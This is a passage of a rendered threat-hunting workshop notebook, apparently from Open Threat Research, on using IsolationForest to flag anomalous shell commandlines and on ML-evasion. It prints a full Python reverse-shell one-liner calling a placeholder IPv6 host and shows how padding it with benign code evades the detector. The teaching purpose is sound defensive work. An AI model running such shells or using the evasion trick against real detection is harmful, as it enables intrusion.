+<span class="n">plot_3d_anomalies</span><span class="p">(</span><span class="n">reduced</span><span class="p">,</span> <span class="n">outlier_index</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<img alt="../../_images/day2-08-Shell-Language-Processing_50_0.png" src="../../_images/day2-08-Shell-Language-Processing_50_0.png" />
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">reduced</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+<span class="n">reduced</span><span class="p">[</span><span class="mi">0</span><span class="p">,:]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>(12730, 3)
+</pre></div>
+</div>
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>array([ 2.88783652,  2.36042639, -2.03719953])
+</pre></div>
+</div>
+</div>
+</div>
+<p>Just as reminder – original vector’s first 50 elemets look like this:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">,:</span><span class="mi">50</span><span class="p">]</span><span class="o">.</span><span class="n">toarray</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>(12730, 100)
+</pre></div>
+</div>
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>array([[0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.53659254, 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.28120821, 0.        , 0.        , 0.        ,
+        0.10521155, 0.        , 0.30281257, 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.31478373, 0.        ,
+        0.        , 0.46885907, 0.        , 0.        , 0.        ]])
+</pre></div>
+</div>
+</div>
+</div>
+<p>Plot allows to see that too many samples in dataset appear to be an “anomaly” in some sense. Therefore, it is wrong to seek for anomalies in your environment - too many aspects of everyday operation are anomalous based on some characteristics of data.</p>
+</div>
+<div class="section" id="bad-questions-for-unsupervised-machine-learning">
+<h2><strong>Bad</strong> questions for unsupervised machine learning:<a class="headerlink" href="#bad-questions-for-unsupervised-machine-learning" title="Permalink to this headline">#</a></h2>
+<ul class="simple">
+<li><p>anomalous commandlines (so I can spot APTs) - your telemetry have hunderds anomalous commandlines a week</p></li>
+<li><p>anomalous network traffic - happens dozens of time every day in production environment</p></li>
+<li><p>anomalous process binary - hello <code class="docutils literal notranslate"><span class="pre">jre1.8.0_311\bin\java.exe</span></code>, <code class="docutils literal notranslate"><span class="pre">~/.tmp/c65631efd85f890604dc3cd8dbd717/vs_setup_bootstrapper.exe</span></code>, etc.</p></li>
+</ul>
+</div>
+<div class="section" id="good-questions-for-unsupervised-machine-learning-focus-on-specific-ttps">
+<h2><strong>Good</strong> questions for unsupervised machine learning focus on specific TTPs:<a class="headerlink" href="#good-questions-for-unsupervised-machine-learning-focus-on-specific-ttps" title="Permalink to this headline">#</a></h2>
+<p>Linux world:</p>
+<ul class="simple">
+<li><p>anomalous python/perl/ruby process (execution via scripting interpreter, <a class="reference external" href="https://attack.mitre.org/techniques/T1059/006/">T1059.006</a>)</p></li>
+<li><p>anomalous systemd command (persistence via systemd process, <a class="reference external" href="https://attack.mitre.org/techniques/T1543/002/">T1543.002</a>)</p></li>
+<li><p>anomalous ssh login source (<a class="reference external" href="https://attack.mitre.org/techniques/T1021/004/">T1021.004</a>)</p></li>
+</ul>
+<p>Windows world:</p>
+<ul class="simple">
+<li><p>anomalous user logged in on DC/MSSQL servers (<a class="reference external" href="https://attack.mitre.org/techniques/T1021/002/">T1021.002</a>, use EventID 4624)</p></li>
+<li><p>anomalous process that loads NTDLL.DLL (<a class="reference external" href="https://attack.mitre.org/techniques/T1129/">T1129</a>, use Sysmon ID 7)</p></li>
+<li><p>anomalous RDP client and server combination (<a class="reference external" href="https://attack.mitre.org/techniques/T1021/001/">T1021.001</a>, use Sysmon ID 3)</p></li>
+</ul>
+<p>Let’s perfom an anomaly detection on python commandlines only (defined as <code class="docutils literal notranslate"><span class="pre">X_python_raw</span></code>) and observe anomalies in 3D plot:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">X_python_benign</span> <span class="o">=</span> <span class="mi">100</span><span class="o">*</span><span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">yy</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">],</span><span class="n">y</span><span class="p">)</span> <span class="k">if</span> <span class="s2">&quot;python&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">and</span> <span class="n">yy</span> <span class="o">==</span> <span class="mi">0</span><span class="p">]</span>
+<span class="n">python_reverse_shell</span> <span class="o">=</span> <span class="p">[(</span><span class="n">x</span><span class="p">,</span><span class="n">yy</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">yy</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">],</span><span class="n">y</span><span class="p">)</span> <span class="k">if</span> <span class="s2">&quot;python&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">and</span> <span class="n">yy</span> <span class="o">==</span> <span class="mi">1</span><span class="p">][</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">X_python_raw</span> <span class="o">=</span> <span class="n">shuffle</span><span class="p">(</span><span class="n">X_python_benign</span> <span class="o">+</span> <span class="p">[</span><span class="n">python_reverse_shell</span><span class="p">],</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">)</span>
+
+<span class="c1"># YOUR CODE HERE:</span>
+<span class="n">X_python_tokens</span><span class="p">,</span> <span class="n">X_python_counter</span> <span class="o">=</span> <span class="n">ShellTokenizer</span><span class="p">()</span><span class="o">.</span><span class="n">tokenize</span><span class="p">(</span><span class="n">X_python_raw</span><span class="p">)</span>
+<span class="n">encoder</span> <span class="o">=</span> <span class="n">ShellEncoder</span><span class="p">(</span><span class="n">X_python_raw</span><span class="p">,</span> <span class="n">X</span><span class="p">[</span><span class="s2">&quot;counter&quot;</span><span class="p">],</span> <span class="n">top_tokens</span><span class="o">=</span><span class="mi">500</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">X_python</span> <span class="o">=</span> <span class="n">encoder</span><span class="o">.</span><span class="n">tfidf</span><span class="p">()</span>
+
+<span class="n">clf</span> <span class="o">=</span> <span class="n">IsolationForest</span><span class="p">(</span><span class="n">n_estimators</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> 
+                        <span class="n">contamination</span><span class="o">=</span><span class="nb">float</span><span class="p">(</span><span class="mf">.02</span><span class="p">),</span>
+                        <span class="n">max_samples</span><span class="o">=</span><span class="s1">&#39;auto&#39;</span><span class="p">,</span>
+                        <span class="n">max_features</span><span class="o">=</span><span class="mf">1.0</span><span class="p">,</span> 
+                        <span class="n">bootstrap</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> 
+                        <span class="n">n_jobs</span><span class="o">=-</span><span class="mi">1</span><span class="p">,</span> 
+                        <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">,</span> 
+                        <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">clf</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">shuffle</span><span class="p">(</span><span class="n">X_python</span><span class="p">,</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">))</span>
+<span class="n">pred</span> <span class="o">=</span> <span class="n">clf</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">X_python</span><span class="p">)</span>
+<span class="n">outlier_index_python</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">pred</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Number of anomalous commands: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">outlier_index_python</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">reduced</span> <span class="o">=</span> <span class="n">reduce</span><span class="p">(</span><span class="n">X_python</span><span class="p">)</span>
+<span class="n">_</span> <span class="o">=</span> <span class="n">plot_3d_anomalies</span><span class="p">(</span><span class="n">reduced</span><span class="p">,</span> <span class="n">outlier_index_python</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stderr highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>2022-12-03 20:40:14,652 root  INFO     [!] Starting TF-IDF encoding!
+2022-12-03 20:40:15,765 root  INFO     [!] TF-IDF encoding finished!
+</pre></div>
+</div>
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[!] Number of anomalous commands: 1
+</pre></div>
+</div>
+<img alt="../../_images/day2-08-Shell-Language-Processing_55_2.png" src="../../_images/day2-08-Shell-Language-Processing_55_2.png" />
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Anomalous command:</span><span class="se">\n\n</span><span class="si">{</span><span class="p">[</span><span class="n">X_python_raw</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">outlier_index_python</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Anomalous command:
+
+python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#39;
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="adversarial-input-evasion-of-ml-heuristics">
+<h1>Adversarial Input - evasion of ML heuristics<a class="headerlink" href="#adversarial-input-evasion-of-ml-heuristics" title="Permalink to this headline">#</a></h1>
+<p>How to perform an evasion of baseline analyzer? Add parts representative for baseline activity to your input!</p>
+<p>This is general rule for many ML evasions – <em>add properties representative for a desired class to your input</em>.</p>
+<p>Let’s see what for <code class="docutils literal notranslate"><span class="pre">python</span></code> is used in benign dataset:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span><span class="p">([</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">X_python_benign</span> <span class="k">if</span> <span class="s2">&quot;import&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">])</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>{&#39;cat file.json | python -c &quot;import sys, json, jsonpath; print \&#39;\\n\&#39;.join(jsonpath.jsonpath(json.load(sys.stdin), \&#39;store.book[?(@.price &lt; 10)].title\&#39;))&quot;&#39;,
+ &#39;cat filename | python -c&quot;from fileinput import input; print sum(map(int, input()))&quot;&#39;,
+ &#39;df -h -B 1M | grep dev/sda | tr -s \&#39; \&#39;| cut -d\&#39; \&#39; -f3 |python -c &quot;import sys; print sum([int(num) for num in sys.stdin.readlines()])&quot;&#39;,
+ &quot;file -L $(python -c &#39;import sys; print(sys.executable)&#39;)&quot;,
+ &#39;find . -lname &quot;`pwd`*&quot; -exec sh -c \&#39;ln -snvf `python -c &quot;from os.path import *; print relpath(\\&quot;$(readlink {})\\&quot;,dirname(\\&quot;{}\\&quot;))&quot;` {}\&#39; \\;&#39;,
+ &#39;find . -name &quot;*.txt&quot; | xargs python -c \&#39;import sys; print sys.argv[1:]\&#39;&#39;}
+</pre></div>
+</div>
+</div>
+</div>
+<p>Let’s form a following reverse shell variant:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> \<span class="s1">&#39; import sys; print(sys.argv[1:]);jsonpath.jsonpath(json.load(test));sys.stdin.readlines();print(sys.executable);import sys; print(sys.argv[1:]);sys.stdin.readlines();print(sys.executable);import os.path; import socket,subprocess,os,pty; s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM); s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);</span><span class="se">\&#39;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">normalized_reverse_shell</span> <span class="o">=</span> <span class="s1">&#39;python -c </span><span class="se">\&#39;</span><span class="s1"> import sys; print(sys.argv[1:]);jsonpath.jsonpath(json.load(test));sys.stdin.readlines();print(sys.executable);import sys; print(sys.argv[1:]);sys.stdin.readlines();print(sys.executable);import os.path; import socket,subprocess,os,pty; s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM); s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);</span><span class="se">\&#39;</span><span class="s1">&#39;</span>
+<span class="n">X_python_raw</span> <span class="o">=</span> <span class="n">shuffle</span><span class="p">(</span><span class="n">X_python_benign</span> <span class="o">+</span> <span class="p">[</span><span class="n">normalized_reverse_shell</span><span class="p">],</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">)</span>
+
+<span class="n">X_python_tokens</span><span class="p">,</span> <span class="n">X_python_counter</span> <span class="o">=</span> <span class="n">ShellTokenizer</span><span class="p">()</span><span class="o">.</span><span class="n">tokenize</span><span class="p">(</span><span class="n">X_python_raw</span><span class="p">)</span>
+<span class="n">encoder</span> <span class="o">=</span> <span class="n">ShellEncoder</span><span class="p">(</span><span class="n">X_python_raw</span><span class="p">,</span> <span class="n">X</span><span class="p">[</span><span class="s2">&quot;counter&quot;</span><span class="p">],</span> <span class="n">top_tokens</span><span class="o">=</span><span class="mi">500</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">X_python</span> <span class="o">=</span> <span class="n">encoder</span><span class="o">.</span><span class="n">tfidf</span><span class="p">()</span>
+
+<span class="n">clf</span> <span class="o">=</span> <span class="n">IsolationForest</span><span class="p">(</span><span class="n">n_estimators</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> 
+                        <span class="n">contamination</span><span class="o">=</span><span class="nb">float</span><span class="p">(</span><span class="mf">.02</span><span class="p">),</span>
+                        <span class="n">max_samples</span><span class="o">=</span><span class="s1">&#39;auto&#39;</span><span class="p">,</span>
+                        <span class="n">max_features</span><span class="o">=</span><span class="mf">1.0</span><span class="p">,</span> 
+                        <span class="n">bootstrap</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> 
+                        <span class="n">n_jobs</span><span class="o">=-</span><span class="mi">1</span><span class="p">,</span> 
+                        <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">,</span> 
+                        <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">clf</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">shuffle</span><span class="p">(</span><span class="n">X_python</span><span class="p">,</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">))</span>
+<span class="n">pred</span> <span class="o">=</span> <span class="n">clf</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">X_python</span><span class="p">)</span>
+<span class="n">outlier_index_python</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">pred</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Number of anomalous commands: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">outlier_index_python</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">reduced</span> <span class="o">=</span> <span class="n">reduce</span><span class="p">(</span><span class="n">X_python</span><span class="p">,</span> <span class="n">n_components</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">_</span> <span class="o">=</span> <span class="n">plot_3d_anomalies</span><span class="p">(</span><span class="n">reduced</span><span class="p">,</span> <span class="n">outlier_index_python</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stderr highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>2022-12-03 20:42:20,433 root  INFO     [!] Starting TF-IDF encoding!
+2022-12-03 20:42:21,575 root  INFO     [!] TF-IDF encoding finished!
+</pre></div>
+</div>
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[!] Number of anomalous commands: 0
+</pre></div>
+</div>
+<img alt="../../_images/day2-08-Shell-Language-Processing_60_2.png" src="../../_images/day2-08-Shell-Language-Processing_60_2.png" />
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span><span class="p">([</span><span class="n">X_python_raw</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">outlier_index_python</span><span class="p">[</span><span class="mi">0</span><span class="p">]])</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>set()
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="summary-and-final-thoughts">
+<h1>Summary and final thoughts<a class="headerlink" href="#summary-and-final-thoughts" title="Permalink to this headline">#</a></h1>
+<ul class="simple">
+<li><p>Machine Learning (ML) is <strong>not</strong> a silver bullet - it will not substitute analysts, humans will not lose their jobs. <strong>Machine Learning is a tool</strong>, and those who master this tool will have an edge in Threat Hunting.</p></li>
+<li><p>For many cases you do not need ML at all. Consider:</p>
+<ul>
+<li><p>triggers against specific <strong>thresholds</strong> to match <strong>countable</strong> events, e.g. number of connections / logins;</p></li>
+<li><p>aggregations like <code class="docutils literal notranslate"><span class="pre">rare_terms</span></code> to filter unusual <strong>categories</strong>, e.g. usernames, IP addresses, etc.</p></li>
+<li><p>manually <strong>post-processing</strong> noisy alerts with extra logic, like grouping them by hostname or usernames;</p></li>
+</ul>
+</li>
+<li><p>Bringing ML in your daily operations require security domain knowledge:</p>
+<ul>
+<li><p>Distinct data sources like Unix <code class="docutils literal notranslate"><span class="pre">auditd</span></code> telemetry benefit hugely from a dedicated tools, like Shell Language Processing tokenizer.</p></li>
+<li><p>ML will not magically detect malicious command because it is anomalous. Daily operations are flooded with anomalous cases. Asking correct question to ML powered with your knowledge on TTPs is the key.</p></li>
+</ul>
+</li>
+<li><p>Remember to correctly evaluate models for security problems:</p>
+<ul>
+<li><p>Classical metrics like accuracy or F1 score are often too shallow.</p></li>
+<li><p>Metrics like <strong>detection rate with fixed False Positive threshold</strong> allows to understand ML model utility in real world, given production usage in SOCs / CERTs / vendor solutions.</p></li>
+</ul>
+</li>
+<li><p>Imbalanced data is a common problem in security domain. Be ready to manualy <strong>augment data</strong> to allow models generalize better.</p></li>
+</ul>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./2022\sessions"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            </main>
+            <footer class="footer-article noprint">
+                
+    <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+    <a class='left-prev' id="prev-link" href="day1-11-Extending_MSTICPy.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">Extending MSTICPy with Pivot functions</p>
+        </div>
+    </a>
+    <a class='right-next' id="next-link" href="../../workshops/day1/intro.html" title="next page">
+    <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">Day 1</p>
+    </div>
+    <i class="fas fa-angle-right"></i>
+    </a>
+</div>
+            </footer>
+        </div>
+    </div>
+    <div class="footer-content row">
+        <footer class="col footer"><p>
+  
+    By Open Threat Research @OTR_Community<br/>
+  
+      &copy; Copyright 2022.<br/>
+</p>
+        </footer>
+    </div>
+    
+</div>
+
+
+      </div>
+    </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf"></script>
+
+
+  </body>
+</html>
